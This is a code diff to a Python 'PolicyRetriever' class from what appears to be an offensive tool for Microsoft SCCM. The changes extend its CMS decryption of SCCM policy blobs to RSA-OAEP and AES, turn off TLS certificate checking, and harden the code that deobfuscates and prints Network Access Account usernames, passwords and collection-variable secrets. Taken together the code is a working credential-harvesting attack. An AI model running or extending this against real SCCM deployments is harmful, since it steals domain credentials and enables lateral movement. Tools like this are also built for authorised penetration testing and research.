@@ -156,6 +156,25 @@ class PolicyRetriever:
                     f"unexpected {desc} tag 0x{actual:02x}, expected 0x{expected:02x}"
                 )
 
+        def decode_oid(oid_bytes):
+            if not oid_bytes:
+                raise ValueError("empty OID")
+
+            first = oid_bytes[0]
+            numbers = [first // 40, first % 40]
+            value = 0
+
+            for byte in oid_bytes[1:]:
+                value = (value << 7) | (byte & 0x7F)
+                if not byte & 0x80:
+                    numbers.append(value)
+                    value = 0
+
+            if value:
+                numbers.append(value)
+
+            return ".".join(str(n) for n in numbers)
+
         # Outer SEQUENCE
         tag, _, pos, _ = read_tag_len(data, 0)
         require_tag(tag, 0x30, "ContentInfo")
@@ -187,9 +206,12 @@ class PolicyRetriever:
         _, rid_len, pos, _ = read_tag_len(data, pos)
         pos += rid_len
         # KeyEncryptionAlgorithm SEQUENCE (skip)
-        tag, kea_len, pos, _ = read_tag_len(data, pos)
+        tag, _, pos, kea_end = read_tag_len(data, pos)
         require_tag(tag, 0x30, "keyEncryptionAlgorithm")
-        pos += kea_len
+        tag, alg_len, pos, _ = read_tag_len(data, pos)
+        require_tag(tag, 0x06, "keyEncryptionAlgorithm OID")
+        key_encryption_alg = decode_oid(data[pos:pos+alg_len])
+        pos = kea_end
         # EncryptedKey OCTET STRING
         tag, _, pos, ek_end = read_tag_len(data, pos)
         require_tag(tag, 0x04, "encryptedKey")
@@ -209,6 +231,7 @@ class PolicyRetriever:
         # Algorithm OID (skip)
         tag, alg_len, pos, _ = read_tag_len(data, pos)
         require_tag(tag, 0x06, "contentEncryptionAlgorithm OID")
+        content_encryption_alg = decode_oid(data[pos:pos+alg_len])
         pos += alg_len
         # IV OCTET STRING
         tag, _, pos, iv_end = read_tag_len(data, pos)
@@ -232,17 +255,37 @@ class PolicyRetriever:
         else:
             raise ValueError(f"unexpected encryptedContent tag 0x{tag:02x}")
 
-        # RSA-decrypt the content encryption key
-        cek = self.private_key.decrypt(encrypted_key, asym_padding.PKCS1v15())
+        if key_encryption_alg == "1.2.840.113549.1.1.7":
+            cek = self.private_key.decrypt(
+                encrypted_key,
+                asym_padding.OAEP(
+                    mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
+                    algorithm=hashes.SHA1(),
+                    label=None,
+                ),
+            )
+        elif key_encryption_alg == "1.2.840.113549.1.1.1":
+            cek = self.private_key.decrypt(encrypted_key, asym_padding.PKCS1v15())
+        else:
+            raise ValueError(f"unsupported key transport OID: {key_encryption_alg}")
 
-        # 3DES-CBC decrypt the content
-        des3 = DES3.new(cek, DES3.MODE_CBC, iv)
-        plaintext = des3.decrypt(ciphertext)
+        if content_encryption_alg == "1.2.840.113549.3.7":
+            cipher = DES3.new(DES3.adjust_key_parity(cek), DES3.MODE_CBC, iv)
+            block_size = 8
+        elif content_encryption_alg == "2.16.840.1.101.3.4.1.2":
+            cipher = AES.new(cek[:16], AES.MODE_CBC, iv)
+            block_size = 16
+        elif content_encryption_alg == "2.16.840.1.101.3.4.1.22":
+            cipher = AES.new(cek[:24], AES.MODE_CBC, iv)
+            block_size = 16
+        elif content_encryption_alg == "2.16.840.1.101.3.4.1.42":
+            cipher = AES.new(cek[:32], AES.MODE_CBC, iv)
+            block_size = 16
+        else:
+            raise ValueError(f"unsupported content encryption OID: {content_encryption_alg}")
 
-        # Remove PKCS5/7 padding
-        pad_len = plaintext[-1]
-        if 0 < pad_len <= 8 and all(b == pad_len for b in plaintext[-pad_len:]):
-            plaintext = plaintext[:-pad_len]
+        plaintext = cipher.decrypt(ciphertext)
+        plaintext = self._pkcs7_unpad(plaintext, block_size)
 
         return plaintext
 
@@ -256,6 +299,13 @@ class PolicyRetriever:
         """
         os.makedirs(output_dir, exist_ok=True)
         session = requests.Session()
+        # SCCM management points often use self-signed certificates
+        session.verify = False
+        try:
+            import urllib3
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        except ImportError:
+            pass
 
         # Use the media GUID as CCMClientID
         ccm_client_id = client_id
@@ -265,7 +315,7 @@ class PolicyRetriever:
         data = ccm_client_id.encode("utf-16-le") + b'\x00\x00'
         ccm_client_id_sig = self._sign_data_sha256(data)
 
-        ccm_timestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
+        ccm_timestamp = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0, tzinfo=None).isoformat() + 'Z'
         data = ccm_timestamp.encode("utf-16-le") + b'\x00\x00'
         ccm_timestamp_sig = self._sign_data_sha256(data)
 
@@ -454,7 +504,7 @@ class PolicyRetriever:
                     if name_el is not None and val_el is not None:
                         var_name = name_el.text
                         var_secret = self._deobfuscate_credential_string(val_el.text)
-                        var_secret = var_secret[:var_secret.rfind('\x00')]
+                        var_secret = var_secret[:var_secret.rfind('\x00')] if '\x00' in var_secret else var_secret
                         print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
             except Exception as e:
                 print(f"[!] Failed to process Collection Settings: {e}")
@@ -485,12 +535,12 @@ class PolicyRetriever:
 
                 if username_el is not None and username_el.text:
                     username = self._deobfuscate_credential_string(username_el.text)
-                    username = username[:username.rfind('\x00')]
+                    username = username[:username.rfind('\x00')] if '\x00' in username else username
                     print(f"[!] Network Access Account Username: '{username}'")
 
                 if password_el is not None and password_el.text:
                     password = self._deobfuscate_credential_string(password_el.text)
-                    password = password[:password.rfind('\x00')]
+                    password = password[:password.rfind('\x00')] if '\x00' in password else password
                     print(f"[!] Network Access Account Password: '{password}'")
 
     def _process_task_sequence_xml(self, ts_xml, output_dir):
@@ -635,7 +685,8 @@ class PolicyRetriever:
         if os.path.exists(naa_raw):
             try:
                 print(f"[*] Decrypting local NAAConfig: {naa_raw}")
-                decrypted = self._cms_decrypt(open(naa_raw, "rb").read())
+                with open(naa_raw, "rb") as raw_f:
+                    decrypted = self._cms_decrypt(raw_f.read())
                 naa_xml = decrypted.decode("utf-16-le")
                 naa_xml = "".join(c for c in naa_xml if c.isprintable())
                 naa_out = os.path.join(output_dir, "NAAConfig.xml")
@@ -656,7 +707,8 @@ class PolicyRetriever:
             ts_name = os.path.basename(ts_raw)
             try:
                 print(f"[*] Decrypting local TaskSequence: {ts_name}")
-                decrypted = self._cms_decrypt(open(ts_raw, "rb").read())
+                with open(ts_raw, "rb") as raw_f:
+                    decrypted = self._cms_decrypt(raw_f.read())
                 ts_xml = decrypted.decode("utf-16-le")
                 ts_xml = "".join(c for c in ts_xml if c.isprintable())
 
@@ -676,7 +728,8 @@ class PolicyRetriever:
         if os.path.exists(col_raw):
             try:
                 print(f"[*] Decrypting local CollectionSettings: {col_raw}")
-                decrypted = self._cms_decrypt(open(col_raw, "rb").read())
+                with open(col_raw, "rb") as raw_f:
+                    decrypted = self._cms_decrypt(raw_f.read())
                 col_xml = decrypted.decode("utf-16-le")
                 col_xml = "".join(c for c in col_xml if c.isprintable())
 
@@ -696,7 +749,7 @@ class PolicyRetriever:
                     if name_el is not None and val_el is not None:
                         var_name = name_el.text
                         var_secret = self._deobfuscate_credential_string(val_el.text)
-                        var_secret = var_secret[:var_secret.rfind('\x00')]
+                        var_secret = var_secret[:var_secret.rfind('\x00')] if '\x00' in var_secret else var_secret
                         print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
             except Exception as e:
                 print(f"[!] Failed to process local CollectionSettings.raw: {e}")
